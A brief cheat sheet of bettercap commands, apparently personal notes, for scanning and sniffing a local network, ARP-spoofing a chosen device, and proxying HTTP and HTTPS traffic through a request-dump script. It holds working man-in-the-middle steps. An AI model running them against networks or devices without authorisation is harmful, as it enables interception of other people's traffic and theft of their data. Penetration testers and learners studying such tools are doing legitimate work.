# bettercap 
swiss army knife for network attacks and monitoring

## scan network
```
net.show
net.probe on
net.sniff on
```

## set ticker
```
set ticker.commands 'net.show'
ticker.period <second>
ticker on
```

## arp spoof
```
set arp.spoof.targets <device>
arp.spoof on
net.show
```

## lost internet
```
events.stream off
net.probe on
sleep 1
net.probe off

set net.sniff.verbose false
set net.sniff.filter tcp port 443
net.sniff on
```

## use this proxy script to dump request
```
set http.proxy.script http-req-dump.js
set https.proxy.script http-req-dump.js

http.proxy on
https.proxy on
arp.spoof on
```
